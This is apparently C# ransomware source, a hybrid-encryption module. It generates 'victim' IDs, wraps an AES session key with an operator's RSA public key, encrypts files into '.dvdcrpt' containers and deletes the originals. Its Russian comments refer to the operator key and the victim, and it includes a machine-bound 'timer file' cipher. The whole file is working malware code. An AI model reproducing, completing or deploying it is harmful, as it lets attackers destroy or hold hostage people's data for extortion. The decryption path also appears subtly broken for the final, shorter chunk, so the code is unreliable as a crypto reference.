using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace ns0
{
    internal static class HybridCrypto
    {
        private const string MagicHeader = "DVDCRPT1";
        private const int ChunkSize = 1024 * 1024;
        private const string IdPrefix = "DVD-";
        private const int FileVersion = 2;

        public static byte[] GenerateSessionKey()
        {
            byte[] key = new byte[32];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(key);
            }
            return key;
        }

        public static string GenerateVictimId()
        {
            byte[] random = new byte[16];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(random);
            }
            return IdPrefix + BitConverter.ToString(random).Replace("-", "").ToLower();
        }

        public static byte[] EncryptSessionKey(byte[] sessionKey)
        {
            string keyXml = KeyProvider.GetPublicKeyXml();
            if (string.IsNullOrEmpty(keyXml) || !KeyProvider.IsKeyValid())
            {
                return null;
            }

            try
            {
                using (var rsa = new RSACryptoServiceProvider(2048))
                {
                    rsa.FromXmlString(keyXml);
                    return rsa.Encrypt(sessionKey, true);
                }
            }
            catch
            {
                return null;
            }
        }

        public static void EncryptSession(byte[] sessionKey, string victimId, out byte[] encryptedKeyBlob)
        {
            encryptedKeyBlob = EncryptSessionKey(sessionKey);
        }

        public static void EncryptFileAesGcm(string filePath, byte[] sessionKey)
        {
            EncryptFileInternal(filePath, sessionKey);
        }

        private static void EncryptFileInternal(string filePath, byte[] sessionKey)
        {
            if (sessionKey == null || sessionKey.Length != 32)
                return;

            string outPath = filePath + ".dvdcrpt";
            string tmpPath = outPath + ".tmp";

            if (File.Exists(outPath))
            {
                using (var fs = new FileStream(outPath, FileMode.Open, FileAccess.Read, FileShare.Read))
                {
                    byte[] magic = new byte[8];
                    if (fs.Read(magic, 0, 8) == 8 && Encoding.ASCII.GetString(magic) == MagicHeader)
                        return;
                }
            }

            FileInfo fi = new FileInfo(filePath);
            long fileSize = fi.Length;
            if (fileSize == 0 || fileSize >= 750L * 1024 * 1024) return;

            int chunkCount = (int)((fileSize + ChunkSize - 1) / ChunkSize);

            try
            {
                byte[] encryptedKeyBlob = EncryptSessionKey(sessionKey);
                if (encryptedKeyBlob == null)
                {
                    // Операторский ключ недоступен — пишем пустой блоб.
                    // Жертва расшифрует по паролю (локальный блоб в KeyPersistence).
                    encryptedKeyBlob = new byte[0];
                }

                using (var aes = new AesCryptoServiceProvider())
                {
                    aes.KeySize = 256;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;

                    // Домены ключей: AES и HMAC выводятся из session key через HKDF,
                    // а не переиспользуют один и тот же ключ (классический footgun).
                    byte[] aesKey, hmacKey;
                    CryptoKeys.DeriveDomainKeys(sessionKey, out aesKey, out hmacKey);
                    aes.Key = aesKey;

                    using (var hmac = new HMACSHA256(hmacKey))
                    {
                        using (var fin = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read, ChunkSize, FileOptions.SequentialScan))
                        using (var fout = new FileStream(tmpPath, FileMode.Create, FileAccess.Write, FileShare.None, ChunkSize))
                        {
                            byte[] magicBytes = Encoding.ASCII.GetBytes(MagicHeader);
                            fout.Write(magicBytes, 0, magicBytes.Length);
                            fout.WriteByte(FileVersion);
                            fout.Write(BitConverter.GetBytes(encryptedKeyBlob.Length), 0, 4);
                            fout.Write(encryptedKeyBlob, 0, encryptedKeyBlob.Length);
                            fout.Write(BitConverter.GetBytes(chunkCount), 0, 4);

                            byte[] buffer = new byte[ChunkSize];
                            byte[] iv = new byte[16];
                            // RNG создаётся ОДИН раз (было: per-chunk — жуткий overhead).
                            using (var rng = RandomNumberGenerator.Create())
                            {

                            for (int i = 0; i < chunkCount; i++)
                            {
                                rng.GetBytes(iv);
                                aes.IV = iv;

                                int read = 0;
                                while (read < ChunkSize)
                                {
                                    int r = fin.Read(buffer, read, ChunkSize - read);
                                    if (r == 0) break;
                                    read += r;
                                }
                                if (read == 0) break;

                                byte[] plaintext = (read == ChunkSize) ? buffer : CopyBytes(buffer, read);

                                using (var encryptor = aes.CreateEncryptor())
                                {
                                    byte[] ciphertext = encryptor.TransformFinalBlock(plaintext, 0, plaintext.Length);
                                    byte[] macInput = Concat(iv, ciphertext);
                                    byte[] tag = hmac.ComputeHash(macInput);

                                    fout.Write(iv, 0, 16);
                                    fout.Write(ciphertext, 0, ciphertext.Length);
                                    fout.Write(tag, 0, 32);
                                }
                            }

                            }

                            fout.Flush(true);
                        }
                    }
                }

                if (File.Exists(outPath)) File.Delete(outPath);
                File.Move(tmpPath, outPath);
                File.Delete(filePath);
            }
            catch
            {
                if (File.Exists(tmpPath)) { try { File.Delete(tmpPath); } catch { } }
            }
        }

        public static byte[] DecryptSessionKey(byte[] encryptedKeyBlob, string privateKeyXml)
        {
            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                rsa.FromXmlString(privateKeyXml);
                return rsa.Decrypt(encryptedKeyBlob, true);
            }
        }

        public static byte[] ExtractEncryptedKeyBlob(string encryptedPath)
        {
            using (var fin = new FileStream(encryptedPath, FileMode.Open, FileAccess.Read, FileShare.Read, 4096, FileOptions.SequentialScan))
            {
                byte[] magic = new byte[8];
                if (fin.Read(magic, 0, 8) != 8) return null;
                if (Encoding.ASCII.GetString(magic) != MagicHeader) return null;

                int version = fin.ReadByte();
                if (version != FileVersion) return null;

                byte[] keyLenBytes = new byte[4];
                if (fin.Read(keyLenBytes, 0, 4) != 4) return null;
                int keyLen = BitConverter.ToInt32(keyLenBytes, 0);

                byte[] keyBlob = new byte[keyLen];
                if (ReadExactly(fin, keyBlob, 0, keyLen) != keyLen) return null;

                return keyBlob;
            }
        }

        public static bool DecryptFile(string encryptedPath, string outputPath, byte[] sessionKey)
        {
            // Пишем во временный файл; на диск кладём только после успешной проверки HMAC.
            // При провале ключа рядом с .dvdcrpt не остаётся мусора.
            string tmpPath = outputPath + ".dectmp";
            try
            {
                bool ok = DecryptFileInternal(encryptedPath, tmpPath, sessionKey);
                if (!ok)
                {
                    try { if (File.Exists(tmpPath)) File.Delete(tmpPath); } catch { }
                    return false;
                }

                try
                {
                    if (File.Exists(outputPath)) File.Delete(outputPath);
                    File.Move(tmpPath, outputPath);
                }
                catch
                {
                    try { if (File.Exists(tmpPath)) File.Delete(tmpPath); } catch { }
                    return false;
                }
                return true;
            }
            catch
            {
                try { if (File.Exists(tmpPath)) File.Delete(tmpPath); } catch { }
                return false;
            }
        }

        private static bool DecryptFileInternal(string encryptedPath, string outputPath, byte[] sessionKey)
        {
            try
            {
                using (var fin = new FileStream(encryptedPath, FileMode.Open, FileAccess.Read, FileShare.Read, ChunkSize, FileOptions.SequentialScan))
                {
                    byte[] magic = new byte[8];
                    if (fin.Read(magic, 0, 8) != 8) return false;
                    if (Encoding.ASCII.GetString(magic) != MagicHeader) return false;

                    int version = fin.ReadByte();
                    // v1 не поддерживается (нет встроенного keyBlob): отказ на уровне заголовка,
                    // симметрично с Decryptor.DecryptFile — одинаковый ответ на v1 в обоих путях.
                    if (version != FileVersion) return false;

                    byte[] keyLenBytes = new byte[4];
                    if (fin.Read(keyLenBytes, 0, 4) != 4) return false;
                    int keyLen = BitConverter.ToInt32(keyLenBytes, 0);
                    byte[] keyBlob = new byte[keyLen];
                    if (ReadExactly(fin, keyBlob, 0, keyLen) != keyLen) return false;

                    byte[] chunkCountBytes = new byte[4];
                    if (fin.Read(chunkCountBytes, 0, 4) != 4) return false;
                    int chunkCount = BitConverter.ToInt32(chunkCountBytes, 0);

                    using (var aes = new AesCryptoServiceProvider())
                    {
                        aes.KeySize = 256;
                        aes.Mode = CipherMode.CBC;
                        aes.Padding = PaddingMode.PKCS7;

                        // Симметрично шифрованию: домены ключей из session key.
                        byte[] aesKey, hmacKey;
                        CryptoKeys.DeriveDomainKeys(sessionKey, out aesKey, out hmacKey);
                        aes.Key = aesKey;

                        using (var hmac = new HMACSHA256(hmacKey))
                        using (var fout = new FileStream(outputPath, FileMode.Create, FileAccess.Write, FileShare.None, ChunkSize))
                        {
                            for (int i = 0; i < chunkCount; i++)
                            {
                                byte[] iv = new byte[16];
                                if (ReadExactly(fin, iv, 0, 16) != 16) return false;

                                int maxCtLen = ChunkSize + 16;
                                byte[] ciphertext = new byte[maxCtLen];
                                if (ReadExactly(fin, ciphertext, 0, maxCtLen) != maxCtLen) return false;

                                byte[] tag = new byte[32];
                                if (ReadExactly(fin, tag, 0, 32) != 32) return false;

                                byte[] macInput = Concat(iv, ciphertext);
                                byte[] expectedTag = hmac.ComputeHash(macInput);
                                if (!FixedTimeEquals(tag, expectedTag)) return false;

                                aes.IV = iv;
                                using (var decryptor = aes.CreateDecryptor())
                                {
                                    byte[] plaintext = decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
                                    fout.Write(plaintext, 0, plaintext.Length);
                                }
                            }

                            fout.Flush(true);
                        }
                    }
                }
                return true;
            }
            catch { return false; }
        }

        public static bool DecryptFile(string encryptedPath, string outputPath, string privateKeyXml)
        {
            try
            {
                byte[] keyBlob = ExtractEncryptedKeyBlob(encryptedPath);
                if (keyBlob == null) return false;

                byte[] sessionKey = DecryptSessionKey(keyBlob, privateKeyXml);
                return DecryptFile(encryptedPath, outputPath, sessionKey);
            }
            catch
            {
                return false;
            }
        }

        private static int ReadExactly(FileStream fs, byte[] buffer, int offset, int count)
        {
            int total = 0;
            while (total < count)
            {
                int read = fs.Read(buffer, offset + total, count - total);
                if (read == 0) break;
                total += read;
            }
            return total;
        }

        private static byte[] CopyBytes(byte[] src, int len)
        {
            byte[] dst = new byte[len];
            Buffer.BlockCopy(src, 0, dst, 0, len);
            return dst;
        }

        private static byte[] Concat(byte[] a, byte[] b)
        {
            byte[] r = new byte[a.Length + b.Length];
            Buffer.BlockCopy(a, 0, r, 0, a.Length);
            Buffer.BlockCopy(b, 0, r, a.Length, b.Length);
            return r;
        }

        private static bool FixedTimeEquals(byte[] a, byte[] b)
        {
            if (a.Length != b.Length) return false;
            int diff = 0;
            for (int i = 0; i < a.Length; i++) diff |= a[i] ^ b[i];
            return diff == 0;
        }

        private static byte[] GetTimerKey()
        {
            byte[] machineGuid = Encoding.UTF8.GetBytes(
                Environment.MachineName +
                Environment.UserName +
                Environment.OSVersion.VersionString
            );
            using (var sha = new SHA256CryptoServiceProvider())
            {
                return sha.ComputeHash(machineGuid);
            }
        }

        public static string EncryptTimerFile(string plainText)
        {
            byte[] key = GetTimerKey();
            byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);
            byte[] iv = new byte[16];
            using (var rng = RandomNumberGenerator.Create())
                rng.GetBytes(iv);

            using (var aes = new AesCryptoServiceProvider())
            {
                aes.KeySize = 256;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = key;
                aes.IV = iv;

                using (var encryptor = aes.CreateEncryptor())
                {
                    byte[] cipherBytes = encryptor.TransformFinalBlock(plainBytes, 0, plainBytes.Length);
                    using (var hmac = new HMACSHA256(key))
                    {
                        // IV входит в MAC: без него подмена IV не детектится.
                        byte[] mac = hmac.ComputeHash(Concat(iv, cipherBytes));
                        byte[] output = new byte[16 + 32 + cipherBytes.Length];
                        Array.Copy(iv, output, 16);
                        Array.Copy(mac, 0, output, 16, 32);
                        Array.Copy(cipherBytes, 0, output, 48, cipherBytes.Length);
                        return Convert.ToBase64String(output);
                    }
                }
            }
        }

        public static string DecryptTimerFile(string encrypted)
        {
            byte[] key = GetTimerKey();
            byte[] data = Convert.FromBase64String(encrypted);
            byte[] iv = new byte[16];
            Array.Copy(data, iv, 16);
            byte[] mac = new byte[32];
            Array.Copy(data, 16, mac, 0, 32);
            byte[] cipherBytes = new byte[data.Length - 48];
            Array.Copy(data, 48, cipherBytes, 0, cipherBytes.Length);

            using (var hmac = new HMACSHA256(key))
            {
                // Симметрично EncryptTimerFile: MAC охватывает IV + ciphertext.
                byte[] computedMac = hmac.ComputeHash(Concat(iv, cipherBytes));
                if (!FixedTimeEquals(mac, computedMac))
                    throw new InvalidOperationException("MAC validation failed");
            }

            using (var aes = new AesCryptoServiceProvider())
            {
                aes.KeySize = 256;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor())
                {
                    byte[] plainBytes = decryptor.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);
                    return Encoding.UTF8.GetString(plainBytes);
                }
            }
        }
    }
}
